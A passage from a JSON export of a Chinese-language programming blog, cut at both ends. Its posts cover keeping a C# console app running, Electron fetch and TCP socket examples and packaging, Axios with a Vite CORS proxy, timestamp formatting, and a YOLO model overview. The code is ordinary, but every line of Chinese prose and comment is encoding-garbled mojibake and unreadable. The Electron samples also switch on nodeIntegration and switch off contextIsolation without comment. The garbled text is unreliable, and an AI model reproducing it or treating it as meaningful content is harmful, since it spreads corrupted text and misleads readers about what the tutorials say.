ä½¿ç”¨æ— é™å¾ªç¯ ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ— é™å¾ªç¯ï¼Œç›´åˆ°ä½ æ‰‹åŠ¨ç»ˆæ­¢ç¨‹åºã€‚ 1234567891011121314//cpuå ç”¨é«˜~using System;class Program&#123; static void Main() &#123; while (true) &#123; // ç¨‹åºåœ¨è¿™é‡Œä¿æŒè¿è¡ŒçŠ¶æ€ï¼Œç­‰å¾…äº‹ä»¶æˆ–å…¶ä»–ä¸­æ–­ã€‚ Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); &#125; &#125;&#125; 3. ä½¿ç”¨å®šæ—¶å™¨åˆ›å»ºä¸€ä¸ªå®šæ—¶å™¨ï¼Œå®šæœŸæ‰§è¡ŒæŸäº›ä»»åŠ¡ï¼Œæˆ–è€…ç”¨äºæ§åˆ¶ç¨‹åºè¡Œä¸ºã€‚ 123456789101112131415161718192021222324using System;using System.Threading;class Program&#123; static void Main() &#123; Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); // åˆ›å»ºä¸€ä¸ªæ–°çš„è®¡æ—¶å™¨å¹¶è®¾å®šé—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ Timer timer = new Timer(TimerCallback, null, 0, 1000); // é˜²æ­¢ä¸»çº¿ç¨‹é€€å‡º Console.ReadKey(); // åœæ­¢å®šæ—¶å™¨ timer.Dispose(); &#125; private static void TimerCallback(Object state) &#123; Console.WriteLine(&quot;The program is still running...&quot;); &#125;&#125; 4. ä½¿ç”¨å¼‚æ­¥ç­‰å¾…å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ .NET Core æˆ– .NET 5 åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå¯ä»¥åˆ©ç”¨ Task.Run æ¥åˆ›å»ºä¸€ä¸ªæŒç»­è¿è¡Œçš„ä»»åŠ¡ã€‚ 1234567891011121314151617181920212223using System;using System.Threading.Tasks;class Program&#123; static async Task Main(string[] args) &#123; Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); await Task.Run(async () =&gt; &#123; while (true) &#123; // æ¨¡æ‹Ÿä¸€äº›å·¥ä½œ await Task.Delay(1000); Console.WriteLine(&quot;Doing work...&quot;); &#125; &#125;); // ç­‰å¾…æŒ‰é”®ï¼Œç¡®ä¿ä¸»çº¿ç¨‹ä¸ä¼šç«‹å³é€€å‡º Console.ReadKey(); &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"console","slug":"console","permalink":"https://banjinmei.github.io/tags/console/"}],"author":"mu"},{"title":"Electron App","slug":"Electron-App","date":"2024-08-04T13:28:01.000Z","updated":"2024-08-04T17:49:58.000Z","comments":true,"path":"2024/08/04/Electron-App/","permalink":"https://banjinmei.github.io/2024/08/04/Electron-App/","excerpt":"","text":"Electron fetch APIå‘é€HTTPè¯·æ±‚1npm install electron --save-dev åˆ›å»ºï¼š1your-electron-app/ â”œâ”€â”€ main.jsâ”œâ”€â”€ renderer.jsâ””â”€â”€ index.html main.js - Electron 1234567891011121314151617181920212223242526272829const &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);function createWindow () &#123; // åˆ›å»ºæµè§ˆå™¨çª—å£ let win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true &#125; &#125;); // åŠ è½½index.htmlæ–‡ä»¶ win.loadFile(&#x27;index.html&#x27;);&#125;app.whenReady().then(createWindow);renderer.js - Electronçš„æ¸²æŸ“å™¨è¿›ç¨‹æ–‡ä»¶ï¼Œä½¿ç”¨fetchå‘é€è¯·æ±‚ï¼šdocument.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; document.getElementById(&#x27;result&#x27;).textContent = JSON.stringify(data, null, 2); &#125;) .catch(error =&gt; &#123; console.error(&#x27;è¯·æ±‚å¤±è´¥:&#x27;, error); &#125;);&#125;); index.html - åº”ç”¨çš„HTMLæ–‡ä»¶ï¼ŒåŒ…å«ä¸€ä¸ªç”¨äºæ˜¾ç¤ºç»“æœçš„å…ƒç´ ï¼š 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Electron Fetch Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Electron Fetch Example&lt;/h1&gt; &lt;pre id=&quot;result&quot;&gt;&lt;/pre&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;è¦è¿è¡Œè¿™ä¸ªElectronåº”ç”¨ç¨‹åºï¼Œè¯·åœ¨your-electron-appç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªpackage.jsonæ–‡ä»¶ï¼Œå¦‚æœè¿˜æ²¡æœ‰çš„è¯ï¼š&#123; &quot;name&quot;: &quot;your-electron-app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;main.js&quot;, &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;electron .&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;electron&quot;: &quot;^your-electron-version&quot; &#125;&#125; ç¡®ä¿å°†â€electronâ€: â€œ^your-electron-versionâ€æ›¿æ¢ä¸ºå®é™…çš„Electronç‰ˆæœ¬å·ã€‚ç„¶åï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨Electronåº”ç”¨ç¨‹åºï¼š 1npm start è§£æJSONä¿®æ”¹renderer.jsæ–‡ä»¶æ¥å®ç° 1234567891011121314151617181920document.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;) .then(response =&gt; &#123; // æ£€æŸ¥å“åº”çŠ¶æ€ if (!response.ok) &#123; throw new Error(&#x27;ç½‘ç»œå“åº”é”™è¯¯&#x27;); &#125; return response.json(); &#125;) .then(data =&gt; &#123; // è§£ææ•°æ®å¹¶å±•ç¤º const &#123; title, body &#125; = data; document.getElementById(&#x27;title&#x27;).textContent = title; document.getElementById(&#x27;body&#x27;).textContent = body; &#125;) .catch(error =&gt; &#123; console.error(&#x27;è¯·æ±‚å¤±è´¥:&#x27;, error); &#125;);&#125;); index.htmlæ–‡ä»¶ä¸­æ·»åŠ ä¸¤ä¸ªå…ƒç´ ï¼Œç”¨äºæ˜¾ç¤ºtitleå’Œbodyï¼š 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Electron JSON Parsing Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;æ–‡ç« æ ‡é¢˜ï¼š&lt;/h1&gt; &lt;p id=&quot;title&quot;&gt;&lt;/p&gt; &lt;h2&gt;æ–‡ç« æ­£æ–‡ï¼š&lt;/h2&gt; &lt;pre id=&quot;body&quot;&gt;&lt;/pre&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ç°åœ¨ï¼Œå½“Electronåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒä¼šä»æŒ‡å®šçš„URLè¯·æ±‚æ•°æ®ï¼Œè§£æJSONå“åº”ï¼Œç„¶åæå–å¹¶æ˜¾ç¤ºtitleå’Œbodyå­—æ®µã€‚è¯·ç¡®ä¿ä½ çš„Electronåº”ç”¨ç¨‹åºçš„main.jsæ–‡ä»¶æ­£ç¡®åœ°åŠ è½½äº†index.htmlæ–‡ä»¶ï¼Œå¹¶ä¸”renderer.jsæ–‡ä»¶è¢«åŒ…å«åœ¨é¡µé¢ä¸­ã€‚è¿™æ ·ï¼Œå½“é¡µé¢åŠ è½½å®Œæˆæ—¶ï¼Œrenderer.jsä¸­çš„ä»£ç å°†æ‰§è¡Œï¼Œä»æœåŠ¡å™¨è·å–æ•°æ®å¹¶æ›´æ–°DOMå…ƒç´ ã€‚ socketElectron åº”ç”¨å¯ä»¥åŒæ—¶ä½¿ç”¨ Node.js å’Œ Chromium çš„ APIï¼Œè¿™ä½¿å¾—å®ƒæ—¢å¯ä»¥åœ¨ä¸»è¿›ç¨‹ä¸­ä½¿ç”¨ Node.js çš„ net æ¨¡å—æ¥åˆ›å»º TCP è¿æ¥ï¼Œä¹Ÿå¯ä»¥åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ä½¿ç”¨ WebSocket æ¥ä¸æœåŠ¡å™¨è¿›è¡Œå®æ—¶é€šä¿¡ã€‚ä»¥ä¸‹æ˜¯åœ¨ Electron çš„ä¸»è¿›ç¨‹ä¸­ä½¿ç”¨ net æ¨¡å—åˆ›å»º TCP è¿æ¥çš„ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536const &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);const net = require(&#x27;net&#x27;);function createWindow () &#123; const win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true, contextIsolation: false &#125; &#125;); // å¹¶åŠ è½½åº”ç”¨çš„ index.html win.loadFile(&#x27;index.html&#x27;); &#125;app.whenReady().then(() =&gt; &#123; setTimeout(() =&gt; &#123; var client = net.connect(&#x27;16551&#x27;, &#x27;1xxx&#x27;, function()&#123; console.log(&#x27;å·²ç»ä¸æœåŠ¡å™¨è¿æ¥&#x27;); client.write(&#x27;Yes\\r\\n&#x27;); &#125;); client.on(&#x27;data&#x27;, function(data)&#123; console.log(data.toString()); client.end();//one msg end &#125;); client.on(&#x27;end&#x27;, function()&#123; console.log(&#x27;å®¢æˆ·ç«¯è¿æ¥ä¸­æ–­&#x27;); &#125;); &#125;, 2000); // &#125;);app.whenReady().then(createWindow); æ‰“åŒ…Electron åº”ç”¨çš„æ‰“åŒ…å’Œè¿è¡Œè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºå‡ ä¸ªæ­¥éª¤ï¼ŒåŒ…æ‹¬å¼€å‘ã€æ‰“åŒ…ã€åˆ†å‘å’Œå®‰è£…ã€‚ä»¥ä¸‹æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„æ¦‚è¿°ï¼š 1. å¼€å‘é˜¶æ®µåœ¨å¼€å‘é˜¶æ®µï¼Œä½ å°†ä½¿ç”¨ Web æŠ€æœ¯ï¼ˆHTMLã€CSSã€JavaScriptï¼‰å’Œ Node.js API æ¥æ„å»ºä½ çš„ Electron åº”ç”¨ã€‚åˆå§‹åŒ–é¡¹ç›®ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ç›®å½•ï¼Œåˆå§‹åŒ– package.json æ–‡ä»¶ã€‚å®‰è£…ä¾èµ–ï¼šä½¿ç”¨ npm å®‰è£… Electron (electron) å’Œå…¶ä»–æ‰€éœ€çš„ä¾èµ–ã€‚ç¼–å†™ä»£ç ï¼šç¼–å†™ä¸»è¿›ç¨‹ (main.js) å’Œæ¸²æŸ“è¿›ç¨‹çš„ä»£ç ï¼ˆé€šå¸¸æ˜¯ HTMLã€CSS å’Œ JavaScript æ–‡ä»¶ï¼‰ã€‚ 2. æœ¬åœ°è¿è¡Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä½ å°†ç»å¸¸è¿è¡Œä½ çš„åº”ç”¨ä»¥æµ‹è¯•åŠŸèƒ½ã€‚ä½¿ç”¨ electron . æˆ– npm start å‘½ä»¤æ¥å¯åŠ¨ä½ çš„ Electron åº”ç”¨ã€‚ 3. æ‰“åŒ…åº”ç”¨æ‰“åŒ…åº”ç”¨æ˜¯å°†ä½ çš„åº”ç”¨çš„æ‰€æœ‰æ–‡ä»¶å’Œä¾èµ–é¡¹æ‰“åŒ…æˆä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºæˆ–å®‰è£…åŒ…ã€‚é€‰æ‹©æ‰“åŒ…å·¥å…·ï¼šElectron ç¤¾åŒºæä¾›äº†å¤šç§æ‰“åŒ…å·¥å…·ï¼Œå¦‚ electron-packagerã€electron-builder å’Œ electron-forgeã€‚é…ç½®æ‰“åŒ…å·¥å…·ï¼šæ ¹æ®ä½ é€‰æ‹©çš„æ‰“åŒ…å·¥å…·ï¼Œé…ç½®æ‰“åŒ…é€‰é¡¹ï¼Œå¦‚å¹³å°ï¼ˆWindowsã€macOSã€Linuxï¼‰ã€æ¶æ„ï¼ˆx64ã€ia32ã€armv7lï¼‰ç­‰ã€‚ 4. ä½¿ç”¨ electron-builder æ‰“åŒ…ç¤ºä¾‹electron-builder æ˜¯ä¸€ä¸ªæµè¡Œçš„æ‰“åŒ…å·¥å…·ï¼Œå®ƒæä¾›äº†ä¸°å¯Œçš„é…ç½®é€‰é¡¹å’Œè·¨å¹³å°æ”¯æŒã€‚å®‰è£… electron-builderï¼š 1npm install electron-builder --save-dev åœ¨ package.json ä¸­é…ç½® build å­—æ®µï¼š 123456789101112131415&#123; &quot;build&quot;: &#123; &quot;appId&quot;: &quot;your.app.id&quot;, &quot;mac&quot;: &#123; &quot;category&quot;: &quot;your.app.category&quot; &#125;, &quot;win&quot;: &#123; &quot;target&quot;: &quot;nsis&quot; &#125;, &quot;linux&quot;: &#123; &quot;target&quot;: &quot;deb&quot;, &quot;category&quot;: &quot;your.app.category&quot; &#125; &#125;&#125; è¿è¡Œæ‰“åŒ…å‘½ä»¤ï¼š 1npm run build 5. åˆ†å‘å’Œå®‰è£…æ‰“åŒ…å®Œæˆåï¼Œä½ å¯ä»¥å°†ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–å®‰è£…åŒ…åˆ†å‘ç»™ç”¨æˆ·ã€‚Windowsï¼šç”¨æˆ·å¯ä»¥ä¸‹è½½ .exe å®‰è£…ç¨‹åºå¹¶è¿è¡Œã€‚macOSï¼šç”¨æˆ·å¯ä»¥ä¸‹è½½ .dmg æˆ– .pkg å®‰è£…åŒ…å¹¶å®‰è£…ã€‚Linuxï¼šç”¨æˆ·å¯ä»¥ä¸‹è½½ .deb æˆ– .AppImage æ–‡ä»¶å¹¶å®‰è£…ã€‚ 6. ç­¾ååº”ç”¨åœ¨æŸäº›å¹³å°ä¸Šï¼Œä½ å¯èƒ½éœ€è¦å¯¹åº”ç”¨è¿›è¡Œä»£ç ç­¾åä»¥ç¡®ä¿å®‰å…¨æ€§å’Œé€šè¿‡åº”ç”¨å•†åº—çš„å®¡æ ¸ã€‚macOSï¼šä½¿ç”¨ Xcode æˆ–å…¶ä»–å·¥å…·è¿›è¡Œç­¾åã€‚Windowsï¼šä½¿ç”¨ Windows SDK çš„ signtool è¿›è¡Œç­¾åã€‚æ³¨æ„äº‹é¡¹åœ¨æ‰“åŒ…å‰ï¼Œè¯·ç¡®ä¿åœ¨ package.json ä¸­è®¾ç½®äº† build.appId å’Œå…¶ä»–ç›¸å…³é…ç½®ã€‚ä¸åŒçš„æ‰“åŒ…å·¥å…·å¯èƒ½æœ‰ä¸åŒçš„é…ç½®é€‰é¡¹ï¼Œå…·ä½“è¯·å‚è€ƒç›¸åº”å·¥å…·çš„æ–‡æ¡£ã€‚åœ¨å‘å¸ƒåº”ç”¨ä¹‹å‰ï¼Œç¡®ä¿åœ¨ç›®æ ‡å¹³å°ä¸Šè¿›è¡Œäº†å……åˆ†çš„æµ‹è¯•ã€‚æ‰“åŒ…å’Œå‘å¸ƒ Electron åº”ç”¨æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œæ¶‰åŠåˆ°å¤šä¸ªæ­¥éª¤å’Œå·¥å…·ã€‚Electron å®˜æ–¹æ–‡æ¡£å’Œç¤¾åŒºæä¾›äº†å¤§é‡èµ„æºæ¥å¸®åŠ©å¼€å‘è€…å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚ or electron-builderï¼Œä½ å¯èƒ½è¿˜æƒ³æ·»åŠ ä¸€äº› npm è„šæœ¬å‘½ä»¤æ¥ç®€åŒ–æ„å»ºè¿‡ç¨‹ï¼š 1234567&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;electron .&quot;, &quot;build&quot;: &quot;electron-builder -w&quot;, &quot;build:mac&quot;: &quot;electron-builder -m&quot;, &quot;build:linux&quot;: &quot;electron-builder -l&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;&#125; è¿™é‡Œï¼Œbuild å‘½ä»¤ä¼šä¸º Windows æ„å»ºåº”ç”¨ç¨‹åºï¼Œbuild:mac ä¼šä¸º macOS æ„å»ºï¼Œbuild:linux ä¼šä¸º Linux æ„å»ºã€‚ä½¿ç”¨è¿™äº›å‘½ä»¤å¯ä»¥å¿«é€Ÿæ„å»ºç‰¹å®šå¹³å°çš„åº”ç”¨ç¨‹åºã€‚ https://www.electronjs.org/docs/latestAPI DOC","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"}],"author":"mu"},{"title":"Axios Cors  && Timestamp","slug":"Axios-Cors-Timestamp","date":"2024-08-04T04:16:25.000Z","updated":"2024-08-04T17:50:16.000Z","comments":true,"path":"2024/08/04/Axios-Cors-Timestamp/","permalink":"https://banjinmei.github.io/2024/08/04/Axios-Cors-Timestamp/","excerpt":"","text":"å…·ä½“æ­¥éª¤å®‰è£… Axios: ä½¿ç”¨ Axios è¿›è¡Œ HTTP è¯·æ±‚ã€‚ å°è£… Axios: å°† Axios å°è£…æˆä¸€ä¸ªæ¨¡å—ä»¥ä¾¿åœ¨é¡¹ç›®ä¸­å¤ç”¨ã€‚ è§£å†³è·¨åŸŸé—®é¢˜: åœ¨ vite.config.ts æ–‡ä»¶ä¸­é…ç½®ä»£ç†ä»¥è§£å†³è·¨åŸŸé—®é¢˜ã€‚ è°ƒç”¨ API: åœ¨ Vue ç»„ä»¶ä¸­ä½¿ç”¨å°è£…çš„ Axios è¿›è¡Œæ•°æ®è¯·æ±‚å’Œæ˜¾ç¤ºã€‚ å®‰è£… Axiosé¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº† Axiosï¼š bashCopy Codenpm install axios å°è£… Axiosåˆ›å»ºä¸€ä¸ª http æ–‡ä»¶å¤¹å¹¶åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ª request.ts æ–‡ä»¶ï¼š src&#x2F;http&#x2F;request.ts: 12345678910111213141516171819202122232425262728293031323334353637import axios from &#x27;axios&#x27;;const service = axios.create(&#123; baseURL: &#x27;http://localhost:16552/api/zblack&#x27;, // æ ¹æ®ä½ çš„åç«¯APIåœ°å€è°ƒæ•´ timeout: 5000, // è¯·æ±‚è¶…æ—¶æ—¶é—´&#125;);// è¯·æ±‚æ‹¦æˆªå™¨service.interceptors.request.use( config =&gt; &#123; return config; &#125;, error =&gt; &#123; console.error(&#x27;è¯·æ±‚é”™è¯¯:&#x27;, error); return Promise.reject(error); &#125;);// å“åº”æ‹¦æˆªå™¨service.interceptors.response.use( response =&gt; &#123; const res = response.data; if (res.isOk) &#123; return res.rsData; &#125; else &#123; console.error(&#x27;è¯·æ±‚é”™è¯¯:&#x27;, res.msg); return Promise.reject(new Error(res.msg || &#x27;Error&#x27;)); &#125; &#125;, error =&gt; &#123; console.error(&#x27;å“åº”é”™è¯¯:&#x27;, error); return Promise.reject(error); &#125;);export default service; 3. è§£å†³è·¨åŸŸé—®é¢˜åœ¨ vite.config.ts æ–‡ä»¶ä¸­æ·»åŠ ä»£ç†é…ç½®ï¼š vite.config.ts: 12345678910111213141516import &#123; defineConfig &#125; from &#x27;vite&#x27;;import vue from &#x27;@vitejs/plugin-vue&#x27;;export default defineConfig(&#123; plugins: [vue()], server: &#123; proxy: &#123; &#x27;/api&#x27;: &#123; target: &#x27;http://localhost:16552&#x27;, changeOrigin: true, rewrite: (path) =&gt; path.replace(/^\\/api/, &#x27;&#x27;), &#125;, &#125;, &#125;,&#125;); 4. åœ¨ Vue ç»„ä»¶ä¸­è°ƒç”¨ APIä½¿ç”¨å°è£…çš„ Axiosï¼š 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%&quot;&gt; &lt;el-table-column fixed prop=&quot;UserBlackID&quot; label=&quot;UserBlackID&quot; width=&quot;150&quot; /&gt; &lt;el-table-column prop=&quot;UserBlockerID&quot; label=&quot;UserBlockerID&quot; width=&quot;120&quot; /&gt; &lt;el-table-column prop=&quot;UserBlockedID&quot; label=&quot;UserBlockedID&quot; width=&quot;120&quot; /&gt; &lt;el-table-column prop=&quot;CreatedAt&quot; label=&quot;CreatedAt&quot; width=&quot;200&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackReason&quot; label=&quot;Reason&quot; width=&quot;300&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackIP&quot; label=&quot;IP&quot; width=&quot;150&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackStatus&quot; label=&quot;Status&quot; width=&quot;120&quot; /&gt; &lt;/el-table&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot; setup&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;;import request from &#x27;@/http/request&#x27;; // æ ¹æ®ä½ çš„è·¯å¾„è°ƒæ•´const tableData = ref([]);onMounted(async () =&gt; &#123; try &#123; const response = await request(&#123; url: &#x27;/api/zblack/FindUserBlackLLL&#x27; &#125;); tableData.value = response; &#125; catch (error) &#123; console.error(&#x27;è·å–æ•°æ®å¤±è´¥:&#x27;, error); &#125;&#125;);&lt;/script&gt;&lt;style scoped lang=&quot;scss&quot;&gt;@import &#x27;./index.scss&#x27;;&lt;/style&gt; è°ƒç”¨æˆåŠŸåˆ™è·¨åŸŸé—®é¢˜ è§£å†³~ ä»€ä¹ˆæ˜¯Unixæ—¶é—´æˆ³(Unix timestamp)ï¼šUnixæ—¶é—´æˆ³(Unix timestamp)ï¼Œæˆ–ç§°Unixæ—¶é—´(Unix time)ã€POSIXæ—¶é—´(POSIX time)ï¼Œæ˜¯ä¸€ç§æ—¶é—´è¡¨ç¤ºæ–¹å¼ï¼Œå®šä¹‰ä¸ºä»æ ¼æ—å¨æ²»æ—¶é—´1970å¹´01æœˆ01æ—¥08æ—¶00åˆ†00ç§’èµ·è‡³ç°åœ¨çš„æ€»ç§’æ•°ã€‚Unixæ—¶é—´æˆ³ä¸ä»…è¢«ä½¿ç”¨åœ¨Unix ç³»ç»Ÿã€ç±»Unixç³»ç»Ÿä¸­ï¼Œä¹Ÿåœ¨è®¸å¤šå…¶ä»–æ“ä½œç³»ç»Ÿä¸­è¢«å¹¿æ³›é‡‡ç”¨ã€‚æ—¶é—´æˆ³(timestamp)ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå­—ç¬¦åºåˆ—ï¼Œå”¯ä¸€åœ°æ ‡è¯†æŸä¸€åˆ»çš„æ—¶é—´ã€‚æ•°å­—æ—¶é—´æˆ³æŠ€æœ¯æ˜¯æ•°å­—ç­¾åæŠ€æœ¯ä¸€ç§å˜ç§çš„åº”ç”¨ã€‚ æ—¶é—´æˆ³è½¬åŒ–ï¼šç¬¬ä¸€æ­¥ï¼šæŠŠæ—¶é—´æˆ³è½¬æˆDateå¯¹è±¡(ä¸ºä»€ä¹ˆä¹˜ä»¥1000ï¼Œå› ä¸º1000æ¯«ç§’æ¢ç®—æˆç§’ç­‰äº1ç§’)const date &#x3D; new Date(1722408384*1000) å°†dateè¿›è¡Œæ ¼å¼åŒ–ï¼Œè½¬æˆå¯¹åº”çš„å­—ç¬¦ä¸²ï¼ˆå› ä¸ºæ—¶é—´æˆ³æ ¼å¼åŒ–å¤ªå¸¸è§ï¼Œå¯ä»¥å°è£…ï¼ŒformatDataï¼‰ 12345678910const formatDate = (timestamp: number) =&gt; &#123; timestamp = timestamp * 1000 const date = new Date(timestamp) console.log(timestamp + &#x27;&#x27; + date) return `$&#123;date.getFullYear()&#125;-$&#123;String(date.getMonth() + 1).padStart(2, &#x27;0&#x27;)&#125;-$&#123;String(date.getDate()).padStart( 2,&#x27;0&#x27;)&#125; $&#123;String(date.getHours()).padStart(2, &#x27;0&#x27;)&#125;:$&#123;String(date.getMinutes()).padStart(2, &#x27;0&#x27;)&#125;:$&#123;String( date.getSeconds() ).padStart(2, &#x27;0&#x27;)&#125;`&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"aaxios","slug":"aaxios","permalink":"https://banjinmei.github.io/tags/aaxios/"},{"name":"cors","slug":"cors","permalink":"https://banjinmei.github.io/tags/cors/"},{"name":"timestamp","slug":"timestamp","permalink":"https://banjinmei.github.io/tags/timestamp/"}],"author":"mu"},{"title":"yolov10","slug":"yolov10","date":"2024-07-29T15:49:16.000Z","updated":"2024-07-29T16:00:42.000Z","comments":true,"path":"2024/07/29/yolov10/","permalink":"https://banjinmei.github.io/2024/07/29/yolov10/","excerpt":"","text":"YOLOv3ã€YOLov3-Ultralyticså’ŒYOLOv3uæ¦‚è¿°æœ¬æ–‡ä»¶æ¦‚è¿°äº†ä¸‰ç§å¯†åˆ‡ç›¸å…³çš„ç‰©ä½“æ£€æµ‹æ¨¡å‹ï¼Œå³YOLOv3ã€YOLOv3-Ultralytics å’ŒYOLOv3uã€‚1.YOLOv3:è¿™æ˜¯â€You Only Look Onceâ€(YOLO)ç‰©ä½“æ£€æµ‹ç®—æ³•çš„ç¬¬ä¸‰ä¸ªç‰ˆæœ¬ã€‚YOLOv3æœ€åˆç”±çº¦ç‘Ÿå¤«-é›·å¾·è’™(Joseph Redmon)å¼€å‘ï¼Œé€šè¿‡å¼•å…¥å¤šå°ºåº¦é¢„æµ‹å’Œä¸‰ç§ä¸åŒå¤§å°çš„æ£€æµ‹å†…æ ¸ç­‰åŠŸèƒ½ï¼ŒYOLOv3 å¯¹å…¶å‰èº«è¿›è¡Œäº†æ”¹è¿›ã€‚YOLOv3-Ultralvtics: è¿™æ˜¯Ultralvticsâ€™ YOLov3 æ¨¡å‹çš„å®ç°ã€‚å®ƒå†ç°äº†åŸå§‹çš„ YOLOv3 æ¶æ„ï¼Œå¹¶æä¾›äº†æ›´å¤šçš„åŠŸ2.èƒ½ï¼Œå¦‚æ”¯æŒæ›´å¤šçš„é¢„è®­ç»ƒæ¨¡å‹å’Œæ›´ç®€å•çš„å®šåˆ¶é€‰é¡¹ã€‚YOLOv3u:è¿™æ˜¯ yOLOv3-ultralvtics çš„æ›´æ–°ç‰ˆæœ¬ï¼Œå®ƒé‡‡ç”¨äº†YOLOv8 æ¨¡å‹ä¸­ä½¿ç”¨çš„æ— é”šã€æ— å¯¹è±¡æ€§åˆ†å‰²å¤´,3.YOLOv3u ä¿ç•™äº†ä¸ YOLOv3 ç›¸åŒçš„éª¨å¹²å’Œé¢ˆéƒ¨ç»“æ„ï¼Œä½†ä½¿ç”¨äº†YOLOv8 æ›´æ–°çš„æ£€æµ‹å¤´ã€‚ YOLov4:é«˜é€Ÿã€ç²¾ç¡®çš„ç‰©ä½“æ¢æµ‹æ¬¢è¿è®¿é—®Ultralytics YoLov4 æ–‡æ¡£é¡µé¢ï¼ŒYOLOv4 æ˜¯ç”± Alexey Bochkovskiyäº 2020,å¹´åœ¨https://github.com/AlexeyAB/darknet æ¨å‡ºçš„æœ€å…ˆè¿›çš„å®æ—¶ç‰©ä½“æ£€æµ‹å™¨ã€‚ YOLOv4 çš„è®¾è®¡åœ¨é€Ÿåº¦å’Œç²¾ç¡®åº¦ä¹‹é—´å®ç°äº†æœ€ä½³å¹³è¡¡ï¼Œæ˜¯è®¸å¤šåº”ç”¨çš„ç†æƒ³é€‰æ‹©ã€‚ YOLOv5u ä»£è¡¨ç€ç‰©ä½“æ£€æµ‹æ–¹æ³•çš„è¿›æ­¥ã€‚YOLOv5u æºè‡ª å¼€å‘çš„ YOLOv5 Ultralvtics å¼€å‘çš„æ¨¡å‹çš„åŸºç¡€ç»“æ„ï¼ŒYOLOv5uæ•´åˆäº†æ— é”šç‚¹ã€æ— å¯¹è±¡æ€§çš„åˆ†å‰²å¤´ï¼Œè¿™æ˜¯ä»¥å‰çš„ YOLov8æ¨¡å‹ä¸­å¼•å…¥çš„åŠŸèƒ½ã€‚è¿™ä¸€è°ƒæ•´å®Œå–„äº†æ¨¡å‹çš„æ¶æ„ï¼Œä»è€Œæé«˜äº†ç‰©ä½“æ£€æµ‹ä»»åŠ¡ä¸­çš„ç²¾åº¦Â·é€Ÿåº¦æƒè¡¡ã€‚é‰´äºç»éªŒç»“æœåŠå…¶è¡ç”Ÿç‰¹å¾ï¼ŒYOLov5u ä¸ºé‚£äº›åœ¨ç ”ç©¶å’Œå®é™…åº”ç”¨ä¸­å¯»æ±‚ç¨³å¥è§£å†³æ–¹æ¡ˆçš„äººæä¾›äº†ä¸€ä¸ªé«˜æ•ˆçš„æ›¿ä»£æ–¹æ¡ˆã€‚ ç¾å›¢YOLOv6 